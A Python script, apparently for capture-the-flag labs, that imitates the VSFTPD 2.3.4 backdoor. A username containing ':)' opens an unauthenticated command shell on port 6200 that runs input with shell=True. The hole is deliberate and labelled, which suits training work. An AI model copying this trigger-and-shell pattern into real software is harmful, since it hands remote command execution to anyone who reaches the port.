#!/usr/bin/env python3
"""
Simplified VSFTPD 2.3.4/5 with backdoor for CTF challenges
The backdoor is triggered when a username contains the ':)' smiley
"""

import socket
import threading
import os
import subprocess
import time
import sys

# FTP response codes
WELCOME = "220 Welcome to VSFTPD 2.3.5 :)\r\n"
USER_OK = "331 Please specify the password.\r\n"
PASS_FAILED = "530 Login incorrect.\r\n"
LOGGED_IN = "230 Login successful.\r\n"
COMMAND_OK = "200 Command okay.\r\n"
PASSIVE_MODE = "227 Entering Passive Mode ({},{},{},{},{},{}).\r\n"
LIST_START = "150 Here comes the directory listing.\r\n"
LIST_END = "226 Directory send OK.\r\n"
CWD_OK = "250 Directory successfully changed.\r\n"
EPSV_MODE = "229 Entering Extended Passive Mode (|||{}|).\r\n"

# Backdoor settings
BACKDOOR_PORT = 6200
FTP_PORT = 21

class FTPServer:
    def __init__(self, host='0.0.0.0', port=FTP_PORT, backdoor_port=BACKDOOR_PORT):
        self.host = host
        self.port = port
        self.backdoor_port = backdoor_port
        self.server_socket = None
        self.running = False
        self.backdoor_triggered = False

    def start(self):
        # Create the FTP server socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            print(f"[+] FTP server listening on {self.host}:{self.port}")
            print(f"[+] Backdoor will be available on port {self.backdoor_port} when triggered")
            
            while self.running:
                try:
                    client_socket, addr = self.server_socket.accept()
                    client_thread = threading.Thread(target=self.handle_client, args=(client_socket, addr))
                    client_thread.daemon = True
                    client_thread.start()
                except Exception as e:
                    print(f"[-] Error accepting connection: {e}")
                    
        except Exception as e:
            print(f"[-] Error starting server: {e}")
        finally:
            if self.server_socket:
                self.server_socket.close()
    
    def handle_client(self, client_socket, addr):
        """Handle FTP client connection"""
        print(f"[+] New connection from {addr[0]}:{addr[1]}")
        
        try:
            # Send welcome message
            client_socket.send(WELCOME.encode('ascii'))
            
            # Process client commands
            while True:
                data = client_socket.recv(1024).decode('ascii').strip()
                if not data:
                    break
                
                print(f"[>] Received: {data}")
                command = data.split(' ')[0].upper()
                
                # Process USER command (check for backdoor trigger)
                if command == "USER":
                    username = data[5:]  # Get username part
                    if ":)" in username:
                        print("[!] Backdoor trigger detected!")
                        # Start backdoor in a separate thread
                        backdoor_thread = threading.Thread(target=self.start_backdoor)
                        backdoor_thread.daemon = True
                        backdoor_thread.start()
                    
                    # Continue with normal FTP flow
                    client_socket.send(USER_OK.encode('ascii'))
                
                # Process PASS command (just fail the login attempt)
                elif command == "PASS":
                    # Always send failure to login (this is a CTF after all)
                    client_socket.send(PASS_FAILED.encode('ascii'))
                
                # Process other commands (simplified, just ack most of them)
                elif command in ["SYST", "FEAT", "TYPE", "MODE", "STRU"]:
                    client_socket.send(COMMAND_OK.encode('ascii'))
                
                # Just echo back a generic response for other commands
                else:
                    client_socket.send(COMMAND_OK.encode('ascii'))
        
        except Exception as e:
            print(f"[-] Error handling client: {e}")
        finally:
            client_socket.close()
            print(f"[+] Connection closed with {addr[0]}:{addr[1]}")
    
    def start_backdoor(self):
        """Start the backdoor shell listener on BACKDOOR_PORT"""
        # Check if backdoor is already running
        if self.backdoor_triggered:
            return
        
        self.backdoor_triggered = True
        
        # Start a socket to listen on the backdoor port
        backdoor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backdoor_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            backdoor_socket.bind((self.host, self.backdoor_port))
            backdoor_socket.listen(1)
            
            print(f"[+] Backdoor listening on {self.host}:{self.backdoor_port}")
            
            while True:
                client_socket, addr = backdoor_socket.accept()
                print(f"[!] Backdoor connection from {addr[0]}:{addr[1]}")
                
                # Start a shell for the client
                self.handle_backdoor_client(client_socket)
                
        except Exception as e:
            print(f"[-] Backdoor error: {e}")
        finally:
            backdoor_socket.close()
            self.backdoor_triggered = False
    
    def handle_backdoor_client(self, client_socket):
        """Handle backdoor client by giving them a shell"""
        try:
            # Send a welcome message to the shell
            client_socket.send(b"VSFTPD 2.3.5 Backdoor Shell\n")
            client_socket.send(b"Flag is located at /opt/secret/flag.txt\n")
            
            # Create a basic shell loop
            while True:
                # Send prompt
                client_socket.send(b"$ ")
                
                # Get command
                cmd_data = client_socket.recv(1024)
                if not cmd_data:
                    break
                
                cmd = cmd_data.decode('utf-8', errors='ignore').strip()
                
                # Execute command
                try:
                    # Using subprocess with shell=True allows redirection, pipes, etc.
                    process = subprocess.Popen(
                        cmd, 
                        shell=True, 
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    stdout, stderr = process.communicate()
                    
                    if stdout:
                        client_socket.send(stdout.encode('utf-8'))
                    if stderr:
                        client_socket.send(stderr.encode('utf-8'))
                    if not stdout and not stderr:
                        client_socket.send(b"Command executed with no output\n")
                        
                except Exception as e:
                    error_msg = f"Error: {str(e)}\n".encode('utf-8')
                    client_socket.send(error_msg)
        
        except Exception as e:
            print(f"[-] Backdoor client error: {e}")
        finally:
            client_socket.close()

if __name__ == "__main__":
    # Create and start FTP server
    server = FTPServer()
    server.start()